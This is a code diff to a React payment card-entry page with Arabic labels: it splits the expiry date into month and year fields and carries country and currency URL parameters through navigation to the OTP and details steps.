@@ -1,7 +1,7 @@
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { useTheme } from "@/themes/ThemeContext";
-import { PaymentHeader, PaymentCard, PaymentButton, PaymentFormField } from "@/components/payment";
+import { PaymentHeader, PaymentCard, PaymentButton, PaymentFormField, PaymentExpiryField } from "@/components/payment";
 import { useLink } from "@/hooks/useSupabase";
 import { CreditCard, Lock, ArrowLeft } from "lucide-react";
 import "@/themes/themeStyles.css";
@@ -12,8 +12,14 @@ const PaymentCardInputTheme = () => {
   const { theme } = useTheme();
   const { data: linkData } = useLink(id);
 
+  // Get URL parameters
+  const urlParams = new URLSearchParams(window.location.search);
+  const countryCode = urlParams.get('country') || "SA";
+  const currencyCode = urlParams.get('currency') || "SAR";
+
   const [cardNumber, setCardNumber] = useState("");
-  const [expiryDate, setExpiryDate] = useState("");
+  const [expiryMonth, setExpiryMonth] = useState("");
+  const [expiryYear, setExpiryYear] = useState("");
   const [cvv, setCvv] = useState("");
   const [cardholderName, setCardholderName] = useState("");
   const [errors, setErrors] = useState<Record<string, string>>({});
@@ -75,7 +81,7 @@ const PaymentCardInputTheme = () => {
       newErrors.cardNumber = "يرجى إدخال رقم بطاقة صحيح";
     }
 
-    if (!expiryDate || expiryDate.length < 5) {
+    if (!expiryMonth || !expiryYear) {
       newErrors.expiryDate = "يرجى إدخال تاريخ انتهاء صالح";
     }
 
@@ -95,12 +101,12 @@ const PaymentCardInputTheme = () => {
     e.preventDefault();
 
     if (validateForm()) {
-      navigate(`/pay/${id}/otp`);
+      navigate(`/pay/${id}/otp?country=${countryCode}&currency=${currencyCode}`);
     }
   };
 
   const handleBack = () => {
-    navigate(`/pay/${id}/details`);
+    navigate(`/pay/${id}/details?country=${countryCode}&currency=${currencyCode}`);
   };
 
   const steps = [
@@ -196,7 +202,7 @@ const PaymentCardInputTheme = () => {
                 <PaymentFormField
                   label="رقم البطاقة"
                   type="text"
-                  placeholder="1234 5678 9012 3456"
+                  placeholder="0000 0000 0000 0000"
                   value={cardNumber}
                   onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                   maxLength={19}
@@ -205,34 +211,26 @@ const PaymentCardInputTheme = () => {
                   variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
                 />
 
-                <div style={{
-                  display: 'grid',
-                  gridTemplateColumns: '1fr 1fr',
-                  gap: theme.spacing.md,
-                }}>
-                  <PaymentFormField
-                    label="تاريخ الانتهاء"
-                    type="text"
-                    placeholder="MM/YY"
-                    value={expiryDate}
-                    onChange={(e) => setExpiryDate(formatExpiryDate(e.target.value))}
-                    maxLength={5}
-                    error={errors.expiryDate}
-                    variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
-                  />
+                <PaymentExpiryField
+                  label="تاريخ الانتهاء"
+                  error={errors.expiryDate}
+                  monthValue={expiryMonth}
+                  yearValue={expiryYear}
+                  onMonthChange={setExpiryMonth}
+                  onYearChange={setExpiryYear}
+                />
 
-                  <PaymentFormField
-                    label="CVV"
-                    type="password"
-                    placeholder="***"
-                    value={cvv}
-                    onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ""))}
-                    maxLength={4}
-                    error={errors.cvv}
-                    leftIcon={<Lock size={20} />}
-                    variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
-                  />
-                </div>
+                <PaymentFormField
+                  label="CVV"
+                  type="password"
+                  placeholder="***"
+                  value={cvv}
+                  onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ""))}
+                  maxLength={4}
+                  error={errors.cvv}
+                  leftIcon={<Lock size={20} />}
+                  variant={theme.style.formField as 'outlined' | 'filled' | 'flat'}
+                />
 
                 <PaymentFormField
                   label="اسم حامل البطاقة"
